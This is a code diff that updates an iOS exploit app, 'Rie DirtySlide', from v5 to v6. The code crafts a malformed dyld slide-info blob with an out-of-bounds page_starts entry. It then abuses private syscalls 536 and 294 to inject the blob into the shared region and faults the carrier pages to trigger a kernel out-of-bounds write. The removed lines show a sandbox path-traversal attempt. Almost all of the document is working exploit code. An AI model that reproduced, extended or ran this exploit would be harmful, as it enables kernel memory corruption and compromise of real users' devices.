@@ -142,7 +142,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v5 ==="];
+    [self log:@"=== Rie DirtySlide v6 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -308,39 +308,48 @@ typedef struct {
     }
 }
 
-// ── Stage 3: First-mapper exploit via syscall 536 ──
+// ── Stage 3: First-mapper exploit via syscall 536 (v6: 3-file/3-mapping, ref pattern) ──
 - (void)runFirstMapper {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"\n── Stage 3: First-Mapper Exploit ──"];
+        [self log:@"\n── Stage 3: Rie v6 First-Mapper ──"];
         [self clearRelaunchFlag];
 
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
 
-        // Scan for non-auth slide carrier (from v240 Phase E)
         Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
         Rie_VMReadOverwriteFn  vmr = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+        if (!vrr || !vmr) { [self log:@"!! missing mach_vm_* APIs"]; return; }
 
-        if (!vrr || !vmr) {
-            [self log:@"!! missing mach_vm_* APIs"];
+        // ── Get shared region base from check_np ──
+        uint64_t srBase = 0;
+        long srCheck = sc(294, &srBase);
+        [self log:[NSString stringWithFormat:@"check_np: ret=%ld base=0x%llx", srCheck, srBase]];
+        if (srCheck != 0 || srBase == 0) {
+            [self log:@"!! shared region not available"];
             return;
         }
 
-        // ── Scan SR for dyld cache headers and non-auth carrier ──
+        // ── Scan SR for dyld cache headers ──
         [self log:@"Scanning SR for dyld cache headers..."];
         uint64_t mainHdrAddr = 0, naHdrAddr = 0;
+        // MWS[0] = header mapping
+        uint64_t hdrAddr = 0, hdrSize = 0, hdrFoff = 0;
+        uint32_t hdrMax = 0, hdrInit = 0;
+        // Non-auth slide carrier
         uint64_t naAddr = 0, naSize = 0, naFoff = 0, naSlide = 0, naFlags = 0;
         uint32_t naMax = 0, naInit = 0;
         uint64_t csOff = 0, csSz = 0;
         int foundNA = -1;
 
-        rie_mach_vm_address_t walk = 0x180000000ULL;
-        for (int segIdx = 0; segIdx < 80; segIdx++) {
+        rie_mach_vm_address_t walk = srBase;
+        rie_mach_vm_address_t srEnd = srBase + 0x100000000ULL; // 4GB scan range
+        for (int segIdx = 0; segIdx < 100; segIdx++) {
             rie_vm_region_info_t info; memset(info, 0, sizeof(info));
             rie_mach_vm_size_t segSize = 0; natural_t segDepth = 1;
             mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
             if (vrr(mach_task_self(), &walk, &segSize, &segDepth,
                 (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
-            if (walk >= 0x204000000ULL) break;
+            if (walk >= srEnd) break;
             if (segSize < 4096) { walk += segSize; continue; }
 
             uint8_t *buf = (uint8_t *)malloc(4096);
@@ -353,10 +362,11 @@ typedef struct {
                 if (segIdx == 0) mainHdrAddr = walk;
                 uint32_t mws_off = *(uint32_t*)(buf + 0x138);
                 uint32_t mws_cnt = *(uint32_t*)(buf + 0x13c);
-                [self log:[NSString stringWithFormat:@"dyld_v1[%d]: a=0x%llx mws_off=0x%x cnt=%u",
-                    segIdx, (unsigned long long)walk, mws_off, mws_cnt]];
+                uint32_t sub_off = *(uint32_t*)(buf + 0x188);
+                uint32_t sub_cnt = *(uint32_t*)(buf + 0x18c);
+                [self log:[NSString stringWithFormat:@"dyld_v1[%d]: a=0x%llx mws=%u sub=%u",
+                    segIdx, (unsigned long long)walk, mws_cnt, sub_cnt]];
 
-                // Read full MWS table
                 uint8_t *fullHdr = (uint8_t *)malloc(0x10000);
                 if (fullHdr) {
                     memset(fullHdr, 0, 0x10000);
@@ -367,12 +377,17 @@ typedef struct {
                             const uint8_t *m = fullHdr + mws_off + mi * 56;
                             uint64_t a, sz, fo, sl, fl;
                             uint32_t mp, ip;
-                            memcpy(&a, m+0, 8); memcpy(&sz, m+8, 8);
+                            memcpy(&a, m+0, 8);  memcpy(&sz, m+8, 8);
                             memcpy(&fo, m+16, 8); memcpy(&sl, m+32, 8);
                             memcpy(&fl, m+40, 8); memcpy(&mp, m+48, 4); memcpy(&ip, m+52, 4);
                             BOOL isSlide = (sl != 0), isAuth = (fl & 1);
                             [self log:[NSString stringWithFormat:@"  MWS[%u]: a=0x%llx sz=0x%llx %@",
                                 mi, a, sz, isSlide ? (isAuth ? @"AUTH" : @"<<< NONAUTH <<<") : @"NOSLIDE"]];
+                            // Save MWS[0] as header mapping
+                            if (mi == 0 && segIdx == 0) {
+                                hdrAddr = a; hdrSize = sz; hdrFoff = fo;
+                                hdrMax = mp; hdrInit = ip;
+                            }
                             if (isSlide && !isAuth && foundNA < 0) {
                                 foundNA = (int)mi;
                                 naAddr = a; naSize = sz; naFoff = fo;
@@ -393,39 +408,42 @@ typedef struct {
         }
 
         if (foundNA < 0) {
-            [self log:@"!! No non-auth slide carrier found"];
-            [self log:@"!! This may mean: not RESLIDE'd, or SR already populated"];
+            [self log:@"!! No non-auth slide carrier found in SR scan"];
+            return;
+        }
+        if (hdrAddr == 0) {
+            [self log:@"!! Header mapping (MWS[0]) not found"];
             return;
         }
 
-        [self log:[NSString stringWithFormat:@"\nNONAUTH carrier: MWS[%d] a=0x%llx sz=0x%llx slide=0x%llx",
-            foundNA, naAddr, naSize, naSlide]];
+        // Calculate blob_sr = first free page after header mapping
+        uint64_t blob_sr = hdrAddr + hdrSize;
+        [self log:[NSString stringWithFormat:@"\nHeader: a=0x%llx sz=0x%llx foff=0x%llx prot=%x/%x",
+            hdrAddr, hdrSize, hdrFoff, hdrMax, hdrInit]];
+        [self log:[NSString stringWithFormat:@"blob_sr: 0x%llx (header end)", blob_sr]];
+        [self log:[NSString stringWithFormat:@"NONAUTH: a=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx prot=%x/%x",
+            naAddr, naSize, naFoff, naSlide, naMax, naInit]];
         [self log:[NSString stringWithFormat:@"codeSig: 0x%llx+0x%llx", csOff, csSz]];
-        [self log:[NSString stringWithFormat:@"mainHdr: 0x%llx carrierHdr: 0x%llx", mainHdrAddr, naHdrAddr]];
 
-        // ── Build slide-info v5 blob with OOB page_starts ──
-        #define BLOB_PS 0x4000
-        #define BLOB_PC 64
-        size_t blobSz = 24 + BLOB_PC * 2;
+        // ── Build slide-info v5 blob ──
+        #define V6_BLOB_PC 64
+        size_t blobSz = 24 + V6_BLOB_PC * 2;
         uint8_t *blob = (uint8_t *)calloc(1, blobSz);
         if (!blob) { [self log:@"!! blob alloc failed"]; return; }
         {
-            uint32_t v5 = 5;
-            uint64_t va = 0;
-            uint32_t bps = BLOB_PS, bpc = BLOB_PC;
+            uint32_t v5 = 5, bps = 0x4000, bpc = V6_BLOB_PC;
+            uint64_t va = 0; // value_add = 0 for now (probe)
             memcpy(blob, &v5, 4);
             memcpy(blob+4, &bps, 4);
             memcpy(blob+8, &bpc, 4);
             memcpy(blob+16, &va, 8);
             uint16_t *ps = (uint16_t*)(blob+24);
-            for (uint32_t j = 0; j < BLOB_PC; j++) ps[j] = 0xFFFF;
-            ps[2] = 0xFFFE;  // OOB trigger
-            [self log:[NSString stringWithFormat:@"blob: ver=%u page_starts[2]=0xFFFE sz=%zu", v5, blobSz]];
+            for (uint32_t j = 0; j < V6_BLOB_PC; j++) ps[j] = 0xFFFF;
+            ps[2] = 0xFFFE;  // OOB trigger at page index 2
+            [self log:[NSString stringWithFormat:@"blob: v5 page_starts[2]=0xFFFE sz=%zu", blobSz]];
         }
 
-        // ── Build sr_cfg ──
-        #define HDR_SZ 0x90000ULL
-        #define BLOB_VA (0x180000000ULL + HDR_SZ)
+        // ── Build sr_cfg in mmap'd buffer (page-aligned) ──
         size_t cfgSz = sizeof(struct rie_sr_cfg) + 0x4000;
         void *cfg = mmap(NULL, cfgSz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
         if (cfg == MAP_FAILED) { [self log:@"!! cfg mmap failed"]; free(blob); return; }
@@ -438,7 +456,7 @@ typedef struct {
         c->blob_size = blobSz;
         memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);
 
-        // ── Try to open dyld cache via sandbox bypass ──
+        // ── Open dyld cache ──
         int fd_main = -1;
         const char *cacheDirs[] = {
             "/System/Library/dyld/",
@@ -447,153 +465,176 @@ typedef struct {
             "/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/",
             "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
         };
-        const char *cacheNames[] = {
-            "dyld_shared_cache_arm64e",
-        };
+        const char *cacheName = "dyld_shared_cache_arm64e";
         int nDirs = sizeof(cacheDirs)/sizeof(cacheDirs[0]);
-        int nNames = sizeof(cacheNames)/sizeof(cacheNames[0]);
 
         for (int pi = 0; pi < nDirs && fd_main < 0; pi++) {
-            for (int ni = 0; ni < nNames && fd_main < 0; ni++) {
-                // Try without path traversal (direct)
-                char direct[1024];
-                snprintf(direct, sizeof(direct), "%s%s", cacheDirs[pi], cacheNames[ni]);
-                NSString *nsp = [NSString stringWithUTF8String:direct];
-                NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
-                if (fh) {
-                    fd_main = dup((int)fh.fileDescriptor);
-                    [fh closeFile];
-                    [self log:[NSString stringWithFormat:@"cache OPEN (direct): %@ fd=%d", nsp, fd_main]];
-                } else {
-                    // Try with path traversal
-                    char raw[1024];
-                    snprintf(raw, sizeof(raw), "%s%s%s",
-                        "../../../../../../../../../../../../../", cacheDirs[pi], cacheNames[ni]);
-                    nsp = [[NSString stringWithUTF8String:raw] stringByResolvingSymlinksInPath];
-                    // Log what we're trying
-                    BOOL exists = [[NSFileManager defaultManager] fileExistsAtPath:nsp];
-                    [self log:[NSString stringWithFormat:@"try: %@ → %@ (exists=%d)",
-                        [NSString stringWithUTF8String:raw], nsp, exists]];
-                    fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
-                    if (fh) {
-                        fd_main = dup((int)fh.fileDescriptor);
-                        [fh closeFile];
-                        [self log:[NSString stringWithFormat:@"cache OPEN (traversal): %@ fd=%d", nsp, fd_main]];
-                    }
-                }
+            char direct[1024];
+            snprintf(direct, sizeof(direct), "%s%s", cacheDirs[pi], cacheName);
+            NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:[NSString stringWithUTF8String:direct]];
+            if (fh) {
+                fd_main = dup((int)fh.fileDescriptor);
+                [fh closeFile];
+                [self log:[NSString stringWithFormat:@"cache OPEN: %s fd=%d", direct, fd_main]];
             }
-        }
-
-        if (fd_main >= 0) {
-            rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
-            // Read code signature offset/size from the file's own dyld header
-            uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
-            uint64_t cs_off = *(uint64_t*)(hb+0x28);
-            uint64_t cs_sz  = *(uint64_t*)(hb+0x30);
-            fs.fs_file_start = (off_t)cs_off;   // offset IN FILE where CS blob is
-            fs.fs_blob_start = NULL;            // read from file, not memory
-            fs.fs_blob_size  = (size_t)cs_sz;
-            int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
-            [self log:[NSString stringWithFormat:@"F_ADDFILESIGS rc=%d cs_off=0x%llx cs_sz=0x%llx file_start=%lld",
-                rc, cs_off, cs_sz, (long long)fs.fs_file_start]];
-        }
-
-        // ── Build file entries (kernel matches by POSITION order) ──
-        int mi = 0;
-        long r536 = -1;
-
-        // Copy blob into mmap'd cfg for page-aligned userspace pointer
-        memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);
-
-        if (fd_main >= 0) {
-            // ── Test A: TEXT-only probe (no slide info) ──
-            [self log:@"\n── Test A: TEXT-only mapping (no slide) ──"];
-            c->files[0].sf_fd = fd_main;
-            c->files[0].sf_mappings_count = 1;
-            c->files[0].sf_slide = 0;
-            c->mappings[mi].sms_address     = 0x180000000ULL;
-            c->mappings[mi].sms_size         = HDR_SZ;
-            c->mappings[mi].sms_file_offset  = 0;
-            c->mappings[mi].sms_max_prot     = 5;
-            c->mappings[mi].sms_init_prot     = 1;
-            mi++;
-
-            c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 0; c->files[1].sf_slide = 0;
-            c->files[2].sf_fd = -1; c->files[2].sf_mappings_count = 0; c->files[2].sf_slide = 0;
-
-            [self log:[NSString stringWithFormat:@"TEXT-only: 1 file, %d mappings", mi]];
-            errno = 0;
-            long rA = sc(536, 3, c->files, mi, c->mappings);
-            [self log:[NSString stringWithFormat:@"syscall(536) TEXT-only: ret=%ld errno=%d", rA, errno]];
-
-            if (rA != 0) {
-                [self log:@"!! TEXT-only failed — cache fd or basic params rejected"];
-                // Continue anyway to see if blob helps
-            }
-
-            // ── Test B: TEXT + blob with slide-info ──
-            [self log:@"\n── Test B: TEXT + blob carrier (with slide-info) ──"];
-            c->files[0].sf_mappings_count = 2;  // now 2 mappings for file[0]
-            // mapping[mi++]: blob carrier
-            c->mappings[mi].sms_address     = BLOB_VA;
-            c->mappings[mi].sms_size         = 0x4000;
-            c->mappings[mi].sms_file_offset  = 0;
-            c->mappings[mi].sms_slide_size   = blobSz;
-            c->mappings[mi].sms_slide_start  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
-            c->mappings[mi].sms_max_prot     = 7;  // R|W|X (must include R|W for rebase)
-            c->mappings[mi].sms_init_prot     = 3;  // R|W
-            mi++;
-
-            c->fault_addr = BLOB_VA;  // point fault_addr to blob carrier
-
-            [self log:[NSString stringWithFormat:@"TEXT+blob: file[0].count=%d total=%d blob_in_cfg=%p",
-                c->files[0].sf_mappings_count, mi, (uint8_t*)cfg + 0x4000]];
-            errno = 0;
-            long rB = sc(536, 3, c->files, mi, c->mappings);
-            [self log:[NSString stringWithFormat:@"syscall(536) TEXT+blob: ret=%ld errno=%d", rB, errno]];
-            r536 = rB;  // use this for success/failure check below
-        } else {
-            c->files[0].sf_fd = -1;
-            c->files[0].sf_mappings_count = 0;
-            c->files[0].sf_slide = 0;
-            c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 0; c->files[1].sf_slide = 0;
-            c->files[2].sf_fd = -1; c->files[2].sf_mappings_count = 0; c->files[2].sf_slide = 0;
         }
 
         if (fd_main < 0) {
-            [self log:@"cache fd not found, using fd=-1 (in-memory)"];
+            [self log:@"!! Cannot open dyld cache — no fd"];
+            free(blob); munmap(cfg, cfgSz); return;
         }
 
-        if (r536 == 0) {
-            [self log:@"\n*** FIRST-MAPPER SUCCESS! syscall 536 returned 0! ***"];
-            [self log:@"OOB write should have been triggered via page_starts[2]=0xFFFE"];
+        // ── F_ADDFILESIGS on main cache ──
+        {
+            uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
+            uint64_t co = *(uint64_t*)(hb+0x28), csz = *(uint64_t*)(hb+0x30);
+            rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
+            fs.fs_file_start = (off_t)co;
+            fs.fs_blob_start = NULL;
+            fs.fs_blob_size  = (size_t)csz;
+            int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
+            [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(main) rc=%d cs=0x%llx+0x%llx", rc, co, csz]];
+        }
 
-            // Fault sweep: read from carrier pages to trigger OOB
-            [self log:@"\nFault sweep: triggering OOB reads..."];
-            uint8_t *carrier = (uint8_t *)mmap(NULL, naSize, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
-            if (carrier && carrier != MAP_FAILED) {
-                volatile uint8_t dummy;
-                for (uint64_t off = 0; off < naSize; off += 0x4000) {
-                    // Try to read from each carrier page to trigger page faults
-                    Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
-                    if (vmr2) {
-                        rie_mach_vm_size_t got = 0;
-                        uint8_t byte;
-                        vmr2(mach_task_self(), naAddr + off, 1,
-                            (rie_mach_vm_address_t)(uintptr_t)&byte, &got);
+        // ── Determine slide carrier fd ──
+        // If non-auth slide was found in the main cache header, use fd_main.
+        // Otherwise it's in a sub-cache — try to find and open it.
+        int fd_sub = fd_main; // default: main cache contains non-auth slide
+        if (naHdrAddr != mainHdrAddr) {
+            [self log:[NSString stringWithFormat:@"Non-auth slide in sub-cache (hdr=0x%llx != main=0x%llx)",
+                naHdrAddr, mainHdrAddr]];
+            // Parse main header for subCacheArray, find matching sub-cache
+            uint8_t mainHdr[0x1000];
+            rie_mach_vm_size_t got = 0;
+            if (vmr(mach_task_self(), mainHdrAddr, 0x1000,
+                (rie_mach_vm_address_t)(uintptr_t)mainHdr, &got) == KERN_SUCCESS) {
+                uint32_t sub_off = *(uint32_t*)(mainHdr + 0x188);
+                uint32_t sub_cnt = *(uint32_t*)(mainHdr + 0x18c);
+                [self log:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u", sub_off, sub_cnt]];
+                for (uint32_t si = 0; si < sub_cnt && si < 10; si++) {
+                    size_t eo = (size_t)sub_off + (size_t)si * 56;
+                    if (eo + 56 > 0x1000) break;
+                    char suffix[33] = {0};
+                    memcpy(suffix, mainHdr + eo + 24, 32);
+                    for (int ci = 0; ci < nDirs && fd_sub == fd_main; ci++) {
+                        char sp[1024];
+                        snprintf(sp, sizeof(sp), "%s%s%s", cacheDirs[ci], cacheName, suffix);
+                        int sfd = open(sp, O_RDONLY);
+                        if (sfd >= 0) {
+                            // Verify this sub-cache has the non-auth slide
+                            uint8_t sh[0x40]; pread(sfd, sh, 0x40, 0);
+                            if (memcmp(sh, "dyld_v1", 7) == 0) {
+                                fd_sub = sfd;
+                                [self log:[NSString stringWithFormat:@"sub-cache OPEN: %s fd=%d", sp, fd_sub]];
+                                uint64_t sco = *(uint64_t*)(sh+0x28), scsz = *(uint64_t*)(sh+0x30);
+                                rie_fsignatures_t fs2; memset(&fs2, 0, sizeof(fs2));
+                                fs2.fs_file_start = (off_t)sco;
+                                fs2.fs_blob_start = NULL;
+                                fs2.fs_blob_size  = (size_t)scsz;
+                                int rc2 = fcntl(sfd, F_ADDFILESIGS_RETURN, &fs2);
+                                [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(sub) rc=%d cs=0x%llx+0x%llx", rc2, sco, scsz]];
+                            } else {
+                                close(sfd);
+                            }
+                        }
                     }
                 }
-                munmap(carrier, naSize);
             }
-            [self log:@"Fault sweep complete."];
+            if (fd_sub == fd_main) {
+                [self log:@"!! Could not open sub-cache with non-auth slide — using main fd anyway"];
+            }
+        }
+
+        // ── Build 3-file, 3-mapping structure (reference pattern) ──
+        // files[0] = main cache → mappings[0] = header (no slide)
+        // files[1] = fd=-1 → mappings[1] = blob inject (copies blob into shared region)
+        // files[2] = slide cache → mappings[2] = slide carrier (slide info → injected blob)
+
+        c->files[0].sf_fd = fd_main;
+        c->files[0].sf_mappings_count = 1;
+        c->files[0].sf_slide = 0;
+
+        c->files[1].sf_fd = -1;
+        c->files[1].sf_mappings_count = 1;
+        c->files[1].sf_slide = 0;
+
+        c->files[2].sf_fd = fd_sub;
+        c->files[2].sf_mappings_count = 1;
+        c->files[2].sf_slide = 0;
+
+        // mappings[0]: header from main cache (no slide info)
+        c->mappings[0].sms_address     = hdrAddr;
+        c->mappings[0].sms_size         = hdrSize;
+        c->mappings[0].sms_file_offset  = hdrFoff;
+        c->mappings[0].sms_slide_size   = 0;
+        c->mappings[0].sms_slide_start  = 0;
+        c->mappings[0].sms_max_prot     = hdrMax;
+        c->mappings[0].sms_init_prot    = hdrInit;
+
+        // mappings[1]: fd=-1 blob inject (copies from process memory into shared region)
+        c->mappings[1].sms_address     = blob_sr;
+        c->mappings[1].sms_size         = 0x4000;
+        c->mappings[1].sms_file_offset  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000); // blob page VA
+        c->mappings[1].sms_slide_size   = 0;
+        c->mappings[1].sms_slide_start  = 0;
+        c->mappings[1].sms_max_prot     = 1;  // VM_PROT_READ
+        c->mappings[1].sms_init_prot    = 1;
+
+        // mappings[2]: slide carrier, slide-info references injected blob in shared region
+        c->mappings[2].sms_address     = naAddr;
+        c->mappings[2].sms_size         = naSize;
+        c->mappings[2].sms_file_offset  = naFoff;
+        c->mappings[2].sms_slide_size   = blobSz;
+        c->mappings[2].sms_slide_start  = blob_sr; // injected blob in shared region
+        c->mappings[2].sms_max_prot     = naMax | 0x20 | 0x40; // VM_PROT_SLIDE | VM_PROT_NOAUTH
+        c->mappings[2].sms_init_prot    = naInit;
+
+        [self log:[NSString stringWithFormat:@"\n3-file/3-mapping setup:"]];
+        [self log:[NSString stringWithFormat:@"  [0] hdr:  a=0x%llx sz=0x%llx foff=0x%llx fd=%d",
+            hdrAddr, hdrSize, hdrFoff, fd_main]];
+        [self log:[NSString stringWithFormat:@"  [1] blob: a=0x%llx sz=0x4000 src=%p fd=-1",
+            blob_sr, (uint8_t*)cfg + 0x4000]];
+        [self log:[NSString stringWithFormat:@"  [2] slid: a=0x%llx sz=0x%llx foff=0x%llx slidestart=0x%llx mp=0x%x fd=%d",
+            naAddr, naSize, naFoff, blob_sr, c->mappings[2].sms_max_prot, fd_sub]];
+        [self log:[NSString stringWithFormat:@"  fault_addr=0x%llx blobSz=%zu", naAddr, blobSz]];
+
+        // ── Call syscall 536 ──
+        errno = 0;
+        long r536 = sc(536, 3, c->files, 3, c->mappings);
+        int savedErrno = errno;
+        [self log:[NSString stringWithFormat:@"\nsyscall(536): ret=%ld errno=%d", r536, savedErrno]];
+
+        if (r536 == 0) {
+            [self log:@"*** FIRST-MAPPER SUCCESS! syscall 536 returned 0! ***"];
+
+            // check_np to nest the region submap
+            uint64_t scratch = 0;
+            long rCheck = sc(294, &scratch);
+            [self log:[NSString stringWithFormat:@"check_np after 536: ret=%ld addr=0x%llx", rCheck, scratch]];
+
+            // Sweep-fault carrier pages to trigger OOB via page_starts[2]=0xFFFE
+            [self log:@"Sweep-faulting carrier pages..."];
+            Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+            if (vmr2) {
+                uint64_t nFaulted = 0;
+                for (uint64_t off = 0; off < naSize && off < 512 * 0x4000; off += 0x4000) {
+                    rie_mach_vm_size_t got = 0;
+                    uint8_t byte;
+                    kern_return_t fkr = vmr2(mach_task_self(), naAddr + off, 1,
+                        (rie_mach_vm_address_t)(uintptr_t)&byte, &got);
+                    if (fkr == KERN_SUCCESS) nFaulted++;
+                }
+                [self log:[NSString stringWithFormat:@"Faulted %llu pages — if system didn't panic, OOB may have landed safely", nFaulted]];
+            }
         } else {
-            [self log:[NSString stringWithFormat:@"syscall 536 FAILED: ret=%ld errno=%d", r536, errno]];
-            if (errno == 22) {
-                [self log:@"EINVAL: not first-mapper, or wrong params"];
-            } else if (errno == 2) {
-                [self log:@"ENOENT: shared region not found"];
-            } else if (errno == 4) {
-                [self log:@"EINTR: interrupted or bad fd"];
+            if (savedErrno == 22) {
+                [self log:@"EINVAL(22): likely not first-mapper (region already populated by dyld)"];
+            } else if (savedErrno == 4) {
+                [self log:@"EINTR(4): bad fd, prot mismatch, or mapping count mismatch"];
+            } else if (savedErrno == 2) {
+                [self log:@"ENOENT(2): shared region not found"];
+            } else if (savedErrno == 12) {
+                [self log:@"ENOMEM(12): region bound but empty (viable first-mapper — should not fail)"];
             }
         }
 
